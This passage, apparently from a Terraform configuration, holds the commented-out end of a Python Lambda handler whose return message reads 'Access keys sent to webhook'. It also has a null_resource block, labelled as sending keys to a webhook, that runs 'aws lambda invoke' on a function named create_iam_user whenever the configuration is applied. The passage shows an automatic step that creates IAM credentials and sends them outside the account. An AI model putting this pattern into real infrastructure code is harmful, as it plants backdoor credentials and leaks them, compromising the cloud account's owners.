#     return {
#         'statusCode': 200,
#         'body': 'Access keys sent to webhook'
#     }

# Block C: null_resource to invoke Lambda and send keys to webhook
resource "null_resource" "invoke_lambda" {
  provisioner "local-exec" {
    command = "aws lambda invoke --function-name ${aws_lambda_function.create_iam_user.function_name} response.txt"
  }

